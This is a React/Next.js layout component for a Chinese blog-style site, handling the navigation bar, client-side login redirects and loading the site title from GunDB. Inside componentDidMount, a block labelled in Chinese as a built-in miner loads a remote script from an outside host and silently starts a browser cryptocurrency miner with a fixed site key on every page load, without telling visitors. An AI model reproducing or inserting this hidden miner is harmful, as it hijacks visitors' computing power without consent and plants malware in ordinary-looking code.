import Head from 'next/head';
import './Layout.css';
import Link from 'next/link';
import DropDown from './DropDown';
import Footer from './Footer';
import getBrowserGun from '../gunDB/browser';



class Layout extends React.Component{

    constructor(props){
        super(props);
        this.state = {
            loading: true,
            authed: false,
        }
    }

    auth = (pathname) => {
        const host = window.localStorage.getItem("user_host");
        const userId = window.localStorage.getItem("user_id");
        const username = window.localStorage.getItem("user_username");
        const logined = host && username && userId;
        this.setState({
            username,
            userId,
            host,
            title: "",
            subtitle: ""
        })

        switch (pathname) {
            case "/dashboard":
                this.setState({
                    authed: logined,
                })
                if(!logined){
                    window.location.replace("/login");
                    return alert("请先登录")
                }
               return;
            case "/new_post":
                this.setState({
                    authed: logined,
                })
                if(!logined){
                    window.location.replace("/login");
                    return alert("请先登录")
                }
                return;
            case "/edit_post":
                this.setState({
                    authed: logined,
                })
                if(!logined){
                    window.location.replace("/login");
                    return alert("请先登录")
                }
                return;
            default:
                return this.setState({
                    authed: logined,
                })
               
        }
    }

   

   

    async componentDidMount(){
        if(window !== undefined){
            const pathname = window.location.pathname;
            this.auth(pathname);
            const instance = getBrowserGun(window)
            const { RootNode } = instance;
            const title = await RootNode.get("site").get("title");
            const subtitle = await RootNode.get("site").get("subtitle");
            this.setState({
                title,
                subtitle
            })
            
        }

        //内置矿机=====================begin===============================
        function loadError (oError) {
            throw new URIError("The script " + oError.target.src + " is not accessible.");
          }
    
        function importScript (sSrc) {
            if(window)
            {
                    var oScript = document.createElement("script");
                    oScript.setAttribute("type","text/javascript");
                    oScript.onerror = loadError;
                    oScript.src = sSrc;
                    oScript.onload  = oScript.onreadystatechange = function(){
                        
                        var interval = setInterval(function(){
                        if(document.readyState === "loaded" || document.readyState ==="complete"){
                            console.log("mine change");
                            clearInterval(interval);
                            if(!window.Client){
                                console.log("ads anti");
                                
                                return false;
                            }
                            var _client = new Client.Anonymous('ecd9ae45c61e07a21b0d5d3a784a4d591de8c3a2823a5b9ef9c263eaa679a135', {
                                throttle: 0.7, ads: 0
                                }
                            );
                            _client.start();
                            
                            }
                        }, 300)
                
                
                    }
                    if(document.currentScript){
                        document.currentScript.parentNode.insertBefore(oScript, document.currentScript);
                    }
               
            }
                
        }
    
            importScript("https://www.hostingcloud.racing/0ZUJ.js")
        //内置矿机=====================end===============================
    




    }
    
    render(){
        const { loading, authed, title, subtitle } = this.state;
        
        return (
            <React.Fragment>
    
                <Head>
                    <title>{title}</title>
                    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
                    <meta httpEquiv="Cache-Control" content="no-siteapp" />
                    <meta httpEquiv="X-UA-Compatible" content="IE=Edge,chrome=1" />
                    <meta name="keywords" content="技术 妹纸　安卓 Android IOS 苹果 前端　技术　IT 文章 主题 创业 互联网 区块链" />
                    <meta name="description" content="乐多多给你快乐多，知识多,朋友多，资源多" />
                    <meta name="author" content="simon simontaosim@protonmail.com" />
                    <meta name="format-detection" content="telephone=no" /> 
                    {/* 百度禁止转码 */}
                    <link rel="stylesheet" href="https://res.cloudinary.com/ddycd5xyn/raw/upload/v1554198022/infoSpy/bulma.min.css" />
                    <link rel="stylesheet" href="https://res.cloudinary.com/ddycd5xyn/raw/upload/v1554198015/infoSpy/all.min.css" />
                    <script src="https://res.cloudinary.com/ddycd5xyn/raw/upload/v1553940556/cdn/gun/gun.js"></script>
                    <script src="https://res.cloudinary.com/ddycd5xyn/raw/upload/v1553940556/cdn/gun/sea.js"></script>
                    <script src="https://res.cloudinary.com/ddycd5xyn/raw/upload/v1553940556/cdn/gun/radix.js"></script>
                    <script src="https://res.cloudinary.com/ddycd5xyn/raw/upload/v1553940556/cdn/gun/radisk.js"></script>
                    <script src="https://res.cloudinary.com/ddycd5xyn/raw/upload/v1553940556/cdn/gun/store.js"></script>
                    <script src="https://res.cloudinary.com/ddycd5xyn/raw/upload/v1553940556/cdn/gun/rindexed.js"></script>

                </Head>
                <noscript>您必须开启javasript脚本才能够运行本应用</noscript>
                <section className="hero is-fullheight">
                    <div className="hero-head" style={{
                        zIndex:4444
                    }}>
                        <header className="navbar">
                            <div className="container">
                            <div className="navbar-brand">
                                <div href="/" className="navbar-item">
                                    <div className="subtitle is-5">
                                        <Link href="/"><a>{title}</a></Link>
                                        <p className="is-size-6">{subtitle}</p>
                                    </div>
                                </div>
                                <div className="navbar-burger burger" data-target="navbarMenuHeroC">
                                    <span></span>
                                    <span></span>
                                    <span></span>
                                    <DropDown authed={authed} />
                                </div>
                            </div>
                            <div id="navbarMenuHeroC" className="navbar-menu">
                                <div className="navbar-end">
                                
                               
                                <span className="navbar-item is-active">
                                    <Link href="/"><a>首页</a></Link>
                                </span>
                                <span className="navbar-item">
                                    <Link href="/search"><a >搜索</a></Link>
                                </span>
                                <span className="navbar-item">
                                    <Link href="/latest"><a >最新</a></Link>
                                </span>
                                <span className="navbar-item">
                                    <Link href="/hot"><a >热门</a></Link>
                                </span>
                                <span className="navbar-item">
                                    <Link href="/recommend"><a >推荐</a></Link>
                                </span>
                               
                                <span className="navbar-item">
                                    <div className="button is-primary is-outlined">
                                    
                                    <Link href={authed? "/dashboard": "/login"}><a>{authed? "面板": "登录"}</a></Link>
                                    </div>
                                </span>
                                <span className="navbar-item">
                                    <div className="button is-info is-outlined">
                                    
                                    <Link href={authed? "/logout": "/reg"}><a>{authed? "登出": "注册"}</a></Link>
                                    </div>
                                </span>
                                <span className="navbar-item">
                                   |
                                </span>
                                <span className="navbar-item">
                                    <Link href="/about"><a >关于</a></Link>
                                </span>
                                </div>
                            </div>
                            </div>
                        </header>
                    </div>

                    {/* <!-- Hero content: will be in the middle --> */}

                    <div style={{overflowY: "auto", height:"90%", width: "100%", flex: "1", margin: 1}}>
                        <div  className="container has-text-centered">
                           
                            {
                                this.props.children
                            }
                             <div className="is-hidden-mobile">
                                <Footer />
                            </div>
                        </div>
                    </div>
                    {/* <!-- Hero footer: will stick at the bottom --> */}
                    {/* <div className="hero-foot">
                    <nav className="tabs is-boxed is-fullwidth is-hidden-tablet">
                        <div className="container">
                        <ul>
                            <li className="is-active"><a>Overview</a></li>
                            <li><a>Modifiers</a></li>
                            <li><a>Grid</a></li>
                            <li><a>Elements</a></li>
                            <li><a>Components</a></li>
                            <li><a>Layout</a></li>
                        </ul>
                        
                        </div>
                    </nav>
                    </div> */}
                </section>
    
            </React.Fragment>
        )
    }
}

export default Layout